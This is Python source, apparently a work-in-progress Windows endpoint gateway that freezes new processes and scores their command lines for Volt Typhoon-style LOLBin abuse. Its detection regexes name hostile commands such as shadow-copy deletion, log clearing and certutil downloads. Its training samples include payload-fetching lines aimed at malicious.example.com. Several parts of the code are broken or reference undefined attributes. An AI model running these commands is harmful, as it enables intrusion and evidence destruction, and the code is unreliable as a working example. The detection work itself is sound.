import asyncio
import json
import time
import logging
import re
import csv
import ctypes
import win32api
import win32con
import win32process
from datetime import datetime
import hashlib
import os
import threading
import queue
import psutil
import joblib
import numpy as np
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from entropy_analyzer import EntropyAnalyzer
from vm_manager import VirtualBoxManager
from ml_analyzer import MLThreatAnalyzer
from process_analyzer import ProcessTreeAnalyzer
from behavioral_analyzer import BehavioralAnalyzer
from lolbins_ml_integration import LOLBinsDatabase, EnhancedMLThreatAnalyzer
from collections import defaultdict
from lolbin_detector import LOLBinDetector
import keyboard
# Windows API imports for real-time monitoring
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
user32 = ctypes.windll.user32

# Constants for Windows API
PROCESS_CREATE_PROCESS = 0x0080
THREAD_CREATE_THREAD = 0x0002

class RealTimeProcessMonitor:
    def __init__(self, callback):
        self.callback = callback
        self.running = False
        self.hook = None
        
    def start(self):
        self.running = True
        threading.Thread(target=self._setup_hooks, daemon=True).start()
        
    def stop(self):
        self.running = False
        if self.hook:
            user32.UnhookWindowsHookEx(self.hook)
            
    def _setup_hooks(self):
    # Set CBT hook for process creation
        CBTProc = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_int, ctypes.c_long, ctypes.c_long
        )
        
        def hook_cb(nCode, wParam, lParam):
            if nCode == win32con.HCBT_CREATEWND:
                try:
                    pid = ctypes.c_ulong()
                    thread_id = user32.GetWindowThreadProcessId(wParam, ctypes.byref(pid))
                    self.callback(pid.value)
                except Exception as e:
                    logging.error(f"Hook error: {e}")
            return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
        
        hook_proc = CBTProc(hook_cb)
        self.hook = user32.SetWindowsHookExA(
            win32con.WH_CBT,
            hook_proc,
            None,
            0
        )
        
        # Message loop using ctypes structure
        class MSG(ctypes.Structure):
            _fields_ = [
                ("hwnd", ctypes.c_void_p),
                ("message", ctypes.c_uint),
                ("wParam", ctypes.c_ulong),
                ("lParam", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("pt", ctypes.c_ulong)
            ]
        
        msg = MSG()
        pMsg = ctypes.pointer(msg)
        
        while self.running:
            if user32.PeekMessageA(pMsg, 0, 0, 0, win32con.PM_REMOVE):
                user32.TranslateMessage(pMsg)
                user32.DispatchMessageA(pMsg)
            time.sleep(0.01)
                            
class EnhancedVoltTyphoonDetector:
    def __init__(self):
        # Volt Typhoon specific command patterns
        self.volt_typhoon_patterns = {
            # Network reconnaissance and pivoting
            'network_recon': [
                r'netsh\s+interface\s+portproxy\s+add',
                r'netsh\s+interface\s+portproxy\s+set',
                r'netsh\s+advfirewall\s+firewall\s+add\s+rule',
                r'netsh\s+wlan\s+show\s+profile',
                r'arp\s+-a',
                r'ipconfig\s+/all',
                r'route\s+print',
                r'nbtstat\s+-n',
            ],
            
            # Credential access and lateral movement
            'credential_access': [
                r'nltest\s+/domain_trusts',
                r'nltest\s+/dclist',
                r'net\s+group\s+"domain\s+admins"',
                r'net\s+user\s+/domain',
                r'net\s+accounts\s+/domain',
                r'dsquery\s+user',
                r'dsquery\s+computer',
                r'dsquery\s+group',
                r'net\s+localgroup\s+administrators',
                r'net\s+group\s+"domain\s+controllers"',
                r'net\s+group\s+"enterprise\s+admins"'
            ],
            
            # Persistence mechanisms
            'persistence': [
                r'schtasks\s+/create.*?/sc\s+onlogon',
                r'schtasks\s+/create.*?/ru\s+system',
                r'sc\s+create.*?binpath.*?cmd',
                r'reg\s+add.*?\\run\\',
                r'reg\s+add.*?\\services\\',
                r'wmic\s+service\s+call\s+create',
            ],
            
            # Defense evasion
            'defense_evasion': [
                r'powershell.*?-windowstyle\s+hidden',
                r'powershell.*?-executionpolicy\s+bypass',
                r'powershell.*?-encodedcommand',
                r'certutil.*?-urlcache.*?-split.*?-f',
                r'bitsadmin\s+/transfer',
                r'regsvr32\s+/s\s+/n\s+/u\s+/i:',
                r'mshta\s+vbscript:',
                r'rundll32\s+javascript:',
                r'powershell.*?-nop',
                r'powershell.*?-noexit',
                r'powershell.*?-noni',
                r'powershell.*?-ep\s+bypass',
                r'wmic.*?process.*?call.*?create',
                r'wmic.*?/node:.*?/user:.*?/password:',
                r'vssadmin\s+delete\s+shadows',
                r'bcdedit\s+/set\s+safeboot',
                r'attrib\s+\+s\s+\+h',
                r'icacls\s+.*?/grant',
                r'wevtutil\s+cl\s+system',
                r'wevtutil\s+cl\s+security',
                r'wevtutil\s+cl\s+application',
                r'fsutil\s+usn\s+deletejournal',
                r'net\s+stop\s+\w+',
                r'net\s+start\s+\w+',
                r'certutil.*?encode',
            r'findstr.*?\/V.*?\-',
            r'bitsadmin.*?\/transfer',
            r'curl.*?\-X\s+POST',
            r'schtasks.*?\\Microsoft\\Windows\\Diagnosis',
            r'wevtutil.*?qe.*?EventID\=4624'
            ],
            
            # Discovery and enumeration
            'discovery': [
                r'tasklist\s+/svc',
                r'whoami\s+/all',
                r'whoami\s+/groups',
                r'systeminfo',
                r'wmic\s+computersystem\s+get',
                r'wmic\s+process\s+list\s+full',
                r'net\s+localgroup\s+administrators',
                r'quser',
                r'query\s+session',
                r'net\s+view',
                r'net\s+user',
                r'net\s+group',
                r'net\s+share',
                r'arp\s+-a',
                r'ipconfig\s+/all',
                r'route\s+print',
                r'nbtstat\s+-a',
                r'nbtstat\s+-n',
                r'nbtstat\s+-s',
            ],
            
            # Data exfiltration preparation
            'collection': [
                r'forfiles.*?/m\s+\*\..*?/c\s+"cmd\s+/c',
                r'findstr.*?/s.*?/i.*?password',
                r'dir.*?/s.*?\*\.txt',
                r'copy.*?\\\\.*?\\c\$',
                r'xcopy.*?/s.*?/h.*?/e',
                r'robocopy.*?/mir',
                r'copy\s+.*?\\\\.*?\\admin\$',
                r'copy\s+.*?\\\\.*?\\c\$',
                r'robocopy\s+.*?\\\\.*?\\c\$',
                r'rar\.exe\s+a\s+.*?\.rar',
                r'7z\.exe\s+a\s+.*?\.7z',
                r'winrar\.exe\s+a\s+.*?\.zip',
            ]
        }
        
        # Suspicious process chains specific to Volt Typhoon
        self.volt_process_chains = [
            ('explorer.exe', 'cmd.exe', 'netsh.exe'),
            ('winlogon.exe', 'cmd.exe', 'nltest.exe'),
            ('services.exe', 'svchost.exe', 'powershell.exe'),
            ('lsass.exe', 'cmd.exe', 'tasklist.exe'),
            ('spoolsv.exe', 'cmd.exe', 'sc.exe'),
            ('svchost.exe', 'cmd.exe', 'reg.exe'),
            ('explorer.exe', 'wscript.exe', 'cscript.exe'),
            ('services.exe', 'cmd.exe', 'schtasks.exe')
        ]
        
        # Network indicators
        self.suspicious_network_patterns = [
            r'(\d{1,3}\.){3}\d{1,3}:443',  # Suspicious HTTPS connections
            r'(\d{1,3}\.){3}\d{1,3}:80',   # Suspicious HTTP connections
            r'tunnel|proxy|socks',          # Tunneling keywords
        ]

    def analyze_for_volt_typhoon(self, process_info, command_line):
        """Enhanced analysis specifically for Volt Typhoon TTPs"""
        risk_score = 0.0
        detected_patterns = []
        
        cmd_lower = command_line.lower()
        process_name = process_info.get('name', '').lower()
        
        # Check for Volt Typhoon command patterns
        for category, patterns in self.volt_typhoon_patterns.items():
            for pattern in patterns:
                if re.search(pattern, command_line, re.IGNORECASE):
                    risk_score += 3.0
                    detected_patterns.append({
                        'category': category,
                        'pattern': pattern,
                        'severity': 'HIGH'
                    })
        
        # Check for suspicious timing (Volt Typhoon often operates during off-hours)
        current_hour = datetime.now().hour
        if current_hour < 6 or current_hour > 22:  # Between 10 PM and 6 AM
            risk_score += 1.0
            detected_patterns.append({
                'category': 'timing',
                'pattern': 'off_hours_activity',
                'severity': 'MEDIUM'
            })
        
        # Check for multiple LOLBins in single command
        lolbin_count = sum(1 for lolbin in self.get_extended_lolbins() 
                          if lolbin in cmd_lower)
        if lolbin_count > 2:
            risk_score += 2.0
            detected_patterns.append({
                'category': 'lolbin_chaining',
                'pattern': f'{lolbin_count}_lolbins_detected',
                'severity': 'HIGH'
            })
        
        # Check for base64 encoded PowerShell (common in Volt Typhoon)
        if 'powershell' in process_name:
            b64_patterns = [
                r'[A-Za-z0-9+/]{50,}={0,2}',  # Base64
                r'-enc.*?[A-Za-z0-9+/]{20,}',  # Encoded command
                r'frombase64string',           # Base64 decoding
                r'convert::frombase64string'   # .NET Base64 decoding
            ]
            
            for pattern in b64_patterns:
                if re.search(pattern, command_line, re.IGNORECASE):
                    risk_score += 2.5
                    detected_patterns.append({
                        'category': 'obfuscation',
                        'pattern': 'base64_encoding',
                        'severity': 'HIGH'
                    })
                    break
        
        # Check for command chaining
        if re.search(r'(&&|\|\||;){2,}', command_line):
            risk_score += 1.5
            detected_patterns.append({
                'category': 'chaining',
                'pattern': 'multiple_command_chaining',
                'severity': 'MEDIUM'
            })
        if not isinstance(process_info, dict):
            logging.error(f"Expected dict, got {type(process_info)}: {process_info}")
            return {
                'volt_typhoon_risk_score': 0.0,
                'detected_patterns': [],
                'is_volt_typhoon_like': False
            }    
        
        # Check for hex encoding
        if re.search(r'(0x[0-9a-fA-F]{2,}){4,}', command_line):
            risk_score += 1.5
            detected_patterns.append({
                'category': 'obfuscation',
                'pattern': 'hex_encoding',
                'severity': 'HIGH'
            })
        
        return {
            'volt_typhoon_risk_score': min(risk_score, 10.0),
            'detected_patterns': detected_patterns,
            'is_volt_typhoon_like': risk_score >= 3.0
        }
        
    
    def get_extended_lolbins(self):
        """Extended LOLBins list including recent additions"""
        return [
            # Original list
            'powershell.exe', 'cmd.exe', 'mshta.exe', 'wscript.exe', 'cscript.exe',
            'regsvr32.exe', 'rundll32.exe', 'forfiles.exe', 'debug.exe',
            'certutil.exe', 'bitsadmin.exe', 'netsh.exe', 'schtasks.exe',
            'tasklist.exe', 'sc.exe', 'whoami.exe', 'net.exe', 'nltest.exe', 
            'msiexec.exe', 'hh.exe', 'ieexec.exe', 'installutil.exe', 'msxsl.exe',
            'dnscmd.exe', 'diskshadow.exe', 'makecab.exe', 'expand.exe',
            'xwizard.exe', 'cmstp.exe', 'scriptrunner.exe', 'msdt.exe',
            'forfiles.exe', 'reg.exe', 'regedit.exe', 'regedt32.exe',
            
            # Additional LOLBins frequently used by Volt Typhoon
            'wbemtest.exe', 'odbcconf.exe', 'regasm.exe', 'regsvcs.exe',
            'installutil.exe', 'msbuild.exe', 'csi.exe', 'rcsi.exe',
            'winrm.vbs', 'slmgr.vbs', 'pubprn.vbs', 'syncappvpublishingserver.vbs',
            'pnputil.exe', 'fltmc.exe', 'relog.exe', 'wusa.exe',
            'esentutl.exe', 'vsjitdebugger.exe', 'sqldumper.exe',
            'sqlps.exe', 'dtexec.exe', 'dnscmd.exe', 'dsacls.exe',
            'ldifde.exe', 'csvde.exe', 'adplus.exe', 'appvlp.exe',
            
            # Additional high-risk LOLBins
            'msbuild.exe', 'installutil.exe', 'regasm.exe', 'regsvcs.exe',
            'msiexec.exe', 'cmstp.exe', 'control.exe'
        ]

class ProcessInterceptor:
    def __init__(self):
        self.process_queue = queue.Queue(maxsize=1000)
        self._seen = set()
        self.running = False
        self.real_time_monitor = RealTimeProcessMonitor(self._process_callback)
        self.high_risk_processes ={p.lower(): d for p, d in {
            # Scripting & Execution
            'powershell.exe': 'PowerShell execution',
            'cmd.exe': 'Command prompt execution',
            'wmic.exe': 'WMI command execution',
            'regsvr32.exe': 'Registry server execution',
            'rundll32.exe': 'DLL execution',
            'mshta.exe': 'HTML application execution',
            'certutil.exe': 'Certificate utility execution',
            'bitsadmin.exe': 'BITS admin execution',

            # Scheduled tasks & persistence
            'schtasks.exe': 'Scheduled task execution',
            'at.exe': 'Legacy task scheduling',

            # Network configuration & proxy abuse
            'netsh.exe': 'Network configuration',
            'proxycfg.exe': 'Proxy manipulation',
            'ipconfig.exe': 'IP configuration view',
            'route.exe': 'Routing table access',
            'arp.exe': 'ARP cache dump',
            'nbtstat.exe': 'NetBIOS network info',
            'sc.exe': 'Service control',

            # Recon & credential gathering
            'net.exe': 'Network info & shares',
            'net1.exe': 'Legacy network info',
            'whoami.exe': 'Identity check',
            'tasklist.exe': 'Process listing',
            'dsquery.exe': 'AD domain queries',
            'nltest.exe': 'Domain trust relationships',
            'quser.exe': 'User session enumeration',
            
            # Additional high-risk LOLBins
            'msbuild.exe': 'MSBuild script execution',
            'installutil.exe': 'InstallUtil execution',
            'regasm.exe': 'RegAsm execution',
            'regsvcs.exe': 'RegSvcs execution',
            'msiexec.exe': 'MSI package execution',
            'cmstp.exe': 'Connection Manager execution',
            'control.exe': 'Control Panel item execution'
        }.items()}

    def start_interception(self):
        self.running = True
        self.real_time_monitor.start()
        threading.Thread(target=self._poll_processes, daemon=True).start()
    def _process_callback(self, pid):
        """Real-time callback for process creation"""
        try:
            proc = psutil.Process(pid)
            with proc.oneshot():
                cmdline = proc.cmdline()
                process_data = {
                    'name': proc.name(),
                    'pid': pid,
                    'ppid': proc.ppid(),
                    'cmdline': ' '.join(cmdline) if cmdline else '',
                    'is_high_risk': proc.name().lower() in self.high_risk_processes,
                    'create_time': time.time()
                }
                self.process_queue.put(process_data)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    def _poll_processes(self):
        """Fallback polling for processes not caught by hook"""
        while self.running:
            try:
                current_pids = set(psutil.pids())
                new_pids = current_pids - self._seen
                for pid in new_pids:
                    try:
                        proc = psutil.Process(pid)
                        if pid not in self._seen and proc.create_time() > time.time() - 1:
                            self._process_callback(pid)
                    except Exception:
                        pass
                self._seen = current_pids
            except Exception as e:
                logging.error(f"Polling error: {e}")
            time.sleep(0.05) 

class LOLBinPatternDetector:
    def __init__(self):
        from lolbin_detector import LOLBIN_PATTERNS, WHITELIST_PATTERNS
        self.patterns = LOLBIN_PATTERNS
        self.whitelist_patterns = WHITELIST_PATTERNS

    def detect(self, process_name, command_line):
        proc_name = process_name.lower()
        cmd_lower = command_line.lower()
        
        # Check if process has defined patterns
        if proc_name not in self.patterns:
            return False, None
        
        # Check whitelist patterns first
        if proc_name in self.whitelist_patterns:
            for pattern in self.whitelist_patterns[proc_name]:
                if re.search(pattern, cmd_lower):
                    return False, None  # Whitelisted pattern match
        
        # Check malicious patterns
        for pattern in self.patterns[proc_name]:
            if re.search(pattern, cmd_lower):
                return True, pattern  # Malicious pattern match
        
        return False, None
class AdaptiveSemaphore:
    """Semaphore that adjusts based on system load"""
    def __init__(self, min_tasks=5, max_tasks=50, load_factor=0.7):
        self.min_tasks = min_tasks
        self.max_tasks = max_tasks
        self.load_factor = load_factor
        self.semaphore = asyncio.Semaphore(min_tasks)
        self.adjust_task = None
    async def start_adjusting(self):  # New method to start adjustment
        self.adjust_task = asyncio.create_task(self._adjust_loop())
        
    async def stop_adjusting(self):  # New method to stop adjustment
        if self.adjust_task:
            self.adjust_task.cancel()
            try:
                await self.adjust_task
            except asyncio.CancelledError:
                pass    
    async def _adjust_loop(self):
        while True:
            await asyncio.sleep(5)  # Adjust every 5 seconds
            cpu_load = psutil.cpu_percent() / 100.0
            current_value = self.semaphore._value
            
            if cpu_load < self.load_factor and current_value < self.max_tasks:
                # Increase concurrency
                for _ in range(min(5, self.max_tasks - current_value)):
                    self.semaphore.release()
            elif cpu_load > self.load_factor and current_value > self.min_tasks:
                # Decrease concurrency
                for _ in range(min(5, current_value - self.min_tasks)):
                    await self.semaphore.acquire()
                    
    async def acquire(self):
        await self.semaphore.acquire()
        
    def release(self):
        self.semaphore.release()
        
    async def __aenter__(self):
        await self.acquire()
        
    async def __aexit__(self, exc_type, exc, tb):
        self.release()

class SecurityGateway:
    def __init__(self):
        self.process_interceptor = ProcessInterceptor()
        self.lolbin_detector = LOLBinDetector()
        self.vm_manager = VirtualBoxManager()
        self.entropy_analyzer = EntropyAnalyzer()
        self.process_analyzer = ProcessTreeAnalyzer()
        self.lolbins_db = LOLBinsDatabase('full_lolbins_raw.txt')
        self.ml_analyzer = EnhancedMLThreatAnalyzer(self.lolbins_db)
        self.volt_detector = EnhancedVoltTyphoonDetector()
        self.behavioral_analyzer = BehavioralAnalyzer()
        #self.lolbin_pattern_detector = LOLBinPatternDetector()
        # Parallel execution setup
        self.cpu_thread_pool = ThreadPoolExecutor(max_workers=os.cpu_count() * 2)
        self.io_thread_pool = ThreadPoolExecutor(max_workers=50)
        self.adaptive_semaphore = AdaptiveSemaphore()
        self.active_tasks = set()
        self.monitoring_active = False

        # Cache for analyzed operations
        self.analysis_cache = {}
        self.cache_ttl = 3600
        
        # Risk thresholds
        self.risk_thresholds = {
            'allow': 3.0,
            'monitor': 6.0,
            'block': 8.0
        }
        
        # Runtime blocklist
        self.runtime_blocklist = []
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('security_gateway.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    def start_keyboard_monitor(self):
    
        def monitor():
            print("🔴 Press ESC to stop the Security Gateway.")
            keyboard.wait("esc")
            self.logger.info("ESC key pressed. Shutting down.")
            self.monitoring_active = False
            self.process_interceptor.running = False
            self.process_interceptor.real_time_monitor.stop()

        threading.Thread(target=monitor, daemon=True).start()
    async def process_analyzer(self, queue):
        while True:
            try:
                item = await queue.get()
                if item is None:  # Handle shutdown signal
                    break
                
                pid, process_name, command_line, creation_time = item
                # Add type checking for OpenConsole.exe
                if process_name.lower() == "openconsole.exe":
                    self.logger.info(f"Skipping analysis for OpenConsole.exe (PID: {pid})")
                    queue.task_done()
                    continue
                    
                self.logger.info(f"Analyzing process: {process_name} (PID: {pid})")
                detection_result = self.lolbin_detector.detect(process_name, command_line)
                
                # Handle different return types
                if isinstance(detection_result, dict) and detection_result.get('detected'):
                    # Process detection logic
                    self.logger.critical(f"LOLBin detected: {process_name} with pattern {detection_result.get('matched_pattern')}")
                    try:
                        self._terminate_process_tree(pid)
                        self._add_to_blocklist(process_name, command_line)
                    except Exception as e:
                        self.logger.error(f"Error blocking process {pid}: {e}")
                elif detection_result is None:
                    # Not detected - allow process
                    self.logger.info(f"No LOLBin detected for {process_name} (PID: {pid}), unfreezing.")
                    await self._unfreeze_process(pid)
                else:
                    self.logger.warning(f"Unexpected detection result type: {type(detection_result)}")
                    await self._unfreeze_process(pid)  # Unfreeze as precaution
                
                queue.task_done()
            except Exception as e:
                self.logger.error(f"Consumer error: {e}")
                queue.task_done()

    async def on_process_event(self, pid, process_name, command_line):
        process_name_lower = process_name.lower()
        
        # Add sppsvc.exe to protected processes
        protected = ["csrss.exe", "wininit.exe", "services.exe", 
                    "lsass.exe", "svchost.exe", "taskhostw.exe",
                    "conhost.exe", "sppsvc.exe"]
        
        if process_name_lower in protected:
            self.logger.info(f"Skipping protected process: {process_name} (PID: {pid})")
            return

        try:
            # Freeze process
            self.process_freeze.freeze(pid)
            self.logger.info(f"Froze process {pid}")
        except Exception as e:
            self.logger.error(f"Failed to freeze process {pid}: {e}")
            self.block_process(pid, "Failed to freeze - high risk")
            return

        # Send for analysis
        await self.analysis_queue.put((pid, process_name, command_line, time.time()))
    async def _run_cpu_bound(self, func, *args):
        """Run CPU-bound tasks in thread pool"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(self.cpu_thread_pool, func, *args)

    async def _run_io_bound(self, func, *args):
        """Run I/O-bound tasks in thread pool"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(self.io_thread_pool, func, *args)

    async def _gather_initial_analyses(self, process_info):
        """Run initial analyses in parallel"""
        name = process_info['name']
        cmdline = process_info.get('cmdline', '')
        pid = process_info['pid']
        
        # Create analysis tasks
        tasks = [
            self._run_cpu_bound(self.lolbin_detector.detect, name, cmdline),
            self._run_cpu_bound(
                self.volt_detector.analyze_for_volt_typhoon, 
                process_info, 
                cmdline
            ),
            self._run_io_bound(self.process_analyzer.analyze_process_chain, pid),
            self._run_cpu_bound(
                self.behavioral_analyzer.analyze_command, 
                cmdline
            )
        ]
        try:
        # Run all tasks concurrently
            return await asyncio.gather(*tasks, return_exceptions=True)
            processed_results = []
            for res in results:
                if isinstance(res, Exception):
                    logging.error(f"Analysis failed: {res}")
                    processed_results.append({})  # Default empty result
                else:
                    processed_results.append(res)
                    
            return processed_results
        except Exception as e:
            logging.error(f"Gather error: {e}")
            return [{}, {}, {}, {}]
    
    async def start_protection(self):
        self.logger.info("Starting Security Gateway...")
        self.start_keyboard_monitor()
        
        # Initialize ML model
        await self._initialize_ml_model()
        
        # Start adaptive semaphore
        await self.adaptive_semaphore.start_adjusting()  # Start adjustment task
        
        # Start process interception
        self.process_interceptor.start_interception()
        self.monitoring_active = True
        
        # Create consumers
        consumer_tasks = [asyncio.create_task(self._process_consumer()) 
                        for _ in range(os.cpu_count())]
        self.active_tasks.update(consumer_tasks)
        
        try:
            while self.monitoring_active:
                await asyncio.sleep(1)
        finally:
            self.logger.info("Shutting down Security Gateway...")
            await self.adaptive_semaphore.stop_adjusting()
            self.process_interceptor.running = False
            self.process_interceptor.real_time_monitor.stop()
            
            for task in consumer_tasks:
                task.cancel()
            await asyncio.gather(*consumer_tasks, return_exceptions=True)

            self.cpu_thread_pool.shutdown(wait=True)
            self.io_thread_pool.shutdown(wait=True)

            self.logger.info("Security Gateway stopped cleanly")

    async def _process_consumer(self):
        """Consumer task for processing intercepted processes"""
        while self.monitoring_active:
            try:
                # Get process from queue with timeout
                process_info = await asyncio.get_event_loop().run_in_executor(
                    self.io_thread_pool,
                    lambda: self.process_interceptor.process_queue.get(timeout=0.1)
                )
                
                # Process with adaptive concurrency control
                async with self.adaptive_semaphore:
                    await self._handle_intercepted_process(process_info)
                    
            except queue.Empty:
                await asyncio.sleep(0.01)
            except Exception as e:
                self.logger.error(f"Consumer error: {e}")
                       
    async def _initialize_ml_model(self):
        """Initialize ML model - load existing or train new one"""
        if not os.path.exists("ml_model.pkl"):
            self.logger.info("ML model not found. Training a new model...")

            # Sample normal processes for training (including benign LOLBins)
            sample_normal_processes = [
                {"name": "explorer.exe", "cmdline": ["explorer.exe"]},
                {"name": "notepad.exe", "cmdline": ["notepad.exe"]},
                {"name": "calc.exe", "cmdline": ["calc.exe"]},
                {"name": "chrome.exe", "cmdline": ["chrome.exe"]},
                {"name": "firefox.exe", "cmdline": ["firefox.exe"]},
                # Benign LOLBins usage
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "echo", "Hello"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Get-Help"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/?"]},
                {"name": "rundll32.exe", "cmdline": ["rundll32.exe", "shell32.dll,Control_RunDLL", "desk.cpl"]},
                {"name": "mshta.exe", "cmdline": ["mshta.exe", "about:blank"]},
                {"name": "bitsadmin.exe", "cmdline": ["bitsadmin.exe", "/list"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/query"]},
                {"name": "whoami.exe", "cmdline": ["whoami.exe"]},
                # Volt Typhoon-like suspicious LOLBins usage (for anomaly detection)
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-windowstyle", "hidden", "-encodedcommand", "aGVsbG8="]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.1 connectport=80"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/create", "/sc", "onlogon", "/tn", "vt-task", "/tr", "cmd.exe /c whoami"]},
                {"name": "certutil.exe", "cmdline": ["certutil.exe", "-urlcache", "-split", "-f", "http://malicious.example.com/payload.exe", "payload.exe"]},
                {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/s", "/n", "/u", "/i:http://malicious.example.com/script.sct", "scrobj.dll"]},
            ]

            if self.ml_analyzer.train_baseline(sample_normal_processes):
                self.ml_analyzer.save_model("ml_model.pkl")
                self.logger.info("Model trained and saved as ml_model.pkl")
            else:
                self.logger.error("Failed to train model — no valid baseline data.")
        else:
           self.logger.info("Loading existing ML model...")
           if self.ml_analyzer.load_model("ml_model.pkl"):
                self.logger.info("ML model loaded successfully")
           else:
                self.logger.error("Failed to load existing ML model")
        
    async def _monitoring_loop(self):
        """Main monitoring loop with concurrent task handling"""
        while self.monitoring_active:
            try:
                while not self.process_interceptor.process_queue.empty():
                    process_info = self.process_interceptor.process_queue.get()
                    task = asyncio.create_task(self._process_with_semaphore(process_info))
                    self.active_tasks.add(task)
                    task.add_done_callback(self.active_tasks.discard)
                    
                await asyncio.sleep(1)
                self.logger.info("Monitoring loop exited. Shutting down.")

            except Exception as e:
                self.logger.error(f"Error in monitoring loop: {e}")
                await asyncio.sleep(1)
    async def _process_with_semaphore(self, process_info):
        """Handle process with concurrency control"""
        async with self.semaphore:
            await self._handle_intercepted_process(process_info)
                    
    async def _handle_intercepted_process(self, process_info):
        """Handle an intercepted process with real-time freezing"""
        pid = process_info['pid']
        name = process_info['name']
        self.logger.info(f"Intercepted process: {name} (PID: {pid})")
        
        # Initialize analysis_result to avoid reference errors
        analysis_result = None
        
        # Skip system and protected processes
        if self._should_skip_process(process_info):
            return
        
        # Freeze process immediately
        if not await self._freeze_process(pid):
            self.logger.error(f"Failed to freeze process {pid}. Blocking as precaution.")
            await self._block_process(process_info, {'reason': 'freeze_failure'})
            return
         # Early LOLBin pattern detection
        name = process_info['name']
        cmdline = process_info.get('cmdline', '')
        is_malicious, pattern = self.lolbin_detector.detect(name, cmdline)
        
        if is_malicious:
            self.logger.critical(f"Blocking LOLBin pattern match: {name} - {pattern}")
            await self._block_process(process_info, {
                'detected_patterns': [f'lolbin_pattern:{pattern}'],
                'immediate_block': True
            })
            return  # Skip further analysis
        # Check if process is high-risk            
        try:
            # Check runtime blocklist
            if self._is_blocklisted(process_info):
                self.logger.warning(f"Blocking blocklisted process: {name}")
                await self._block_process(process_info, {'detected_patterns': ['runtime_blocklist_match']})
                return
                
            # Generate cache key
            cache_key = self._generate_cache_key(process_info)
            
            # Check cache
            if cache_key in self.analysis_cache:
                cached_result = self.analysis_cache[cache_key]
                if time.time() - cached_result['timestamp'] < self.cache_ttl:
                    self.logger.info(f"Using cached result for {name}")
                    await self._make_decision(process_info, cached_result['analysis'])
                    return
                    
            # Perform full analysis
            analysis_result = await self._analyze_process(process_info)
            
            # Cache result
            self.analysis_cache[cache_key] = {
                'analysis': analysis_result,
                'timestamp': time.time()
            }
            
            # Make decision
            await self._make_decision(process_info, analysis_result)
            
        except Exception as e:
            self.logger.error(f"Error handling process {pid}: {e}")
            # If analysis fails, block the process as precaution
            await self._block_process(process_info, {'error': str(e)})
        finally:
            # If we allowed the process, resume it
            if analysis_result and analysis_result.get('final_decision') == 'ALLOW':
                await self._unfreeze_process(pid)
    def _should_skip_process(self, process_info):
        """Determine if a process should be skipped from analysis"""
        protected_names = {
            "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", 
            "wininit.exe", "services.exe", "lsass.exe", "svchost.exe", "winlogon.exe",
            "explorer.exe", "fontdrvhost.exe", "dwm.exe", "ctfmon.exe", "spoolsv.exe",
            "RuntimeBroker.exe", "ShellExperienceHost.exe", "SearchIndexer.exe", 
            "StartMenuExperienceHost.exe", "conhost.exe", "taskhostw.exe", 
            "AggregatorHost.exe", "LsaIso.exe", "msedgewebview2.exe", 
            "MpDefenderCoreService.exe", "MsMpEng.exe", "NisSrv.exe", "Widgets.exe",
            "NgcIso.exe", "sihost.exe", "ShellHost.exe", "python.exe", "chrome.exe", 
            "firefox.exe", "notepad.exe", "calc.exe", "MemCompression"
        }
        
        if (process_info['name'] in protected_names or 
            process_info['pid'] in (0, 4, os.getpid())):
            self.logger.info(f"Skipping protected process: {process_info['name']} (PID: {process_info['pid']})")
            return True
        return False                        
    def _is_blocklisted(self, process_info):
        """Check if process matches runtime blocklist"""
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '').lower()
        
        for entry in self.runtime_blocklist:
            if entry['name'] == name:
                if any(pattern in cmdline for pattern in entry['cmdline_patterns']):
                    return True
        return False
        
    def _generate_cache_key(self, process_info):
        """Generate cache key for process"""
        key_data = f"{process_info['name']}:{process_info.get('cmdline', '')}"
        return hashlib.md5(key_data.encode()).hexdigest()
        
    async def _analyze_process(self, process_info):
        """Refactored comprehensive parallel process analysis"""
        analysis_start = time.time()
        analysis_results = {
            'timestamp': datetime.now().isoformat(),
            'process_info': process_info,
            'analyses': {},
            'final_risk_score': 0.0,
            'final_decision': 'ALLOW'
        }

        try:
            # Run parallel analysis components
            results = await self._gather_initial_analyses(process_info)
            lolbin_result, volt_result, tree_result, behavioral_result = results
            
            # Unpack and store results
            analysis_results['analyses'].update({
                'lolbin': lolbin_result,
                'volt_typhoon': volt_result,
                'process_tree': tree_result
            })
            
            # Handle behavioral analysis result
            if isinstance(behavioral_result, tuple):
                threat_level, confidence, flags = behavioral_result
                analysis_results['analyses']['behavioral'] = {
                    'threat_level': threat_level,
                    'confidence': confidence,
                    'flags': flags
                }
            else:
                analysis_results['analyses']['behavioral'] = {
                    'threat_level': 0,
                    'confidence': 0.0,
                    'flags': []
                }
            
            # Prepare and run ML analysis
            ml_features = {
                **process_info,
                'is_lolbin': bool(lolbin_result and lolbin_result.get('detected')),
                'lolbin_severity': lolbin_result.get('severity') if lolbin_result else 'none'
            }
            ml_analysis = await self._run_cpu_bound(
                self.ml_analyzer.predict_threat, 
                ml_features
            )
            analysis_results['analyses']['ml_prediction'] = ml_analysis
            
            # Run conditional sandbox analysis
            analysis_results['analyses']['sandbox'] = await self._run_sandbox_analysis(
                process_info, 
                lolbin_result, 
                ml_analysis
            )
            
            # Final risk calculation
            analysis_results['final_risk_score'] = self._calculate_final_risk(
                analysis_results['analyses']
            )
            
            # Special case: Multiple LOLBins in command chain
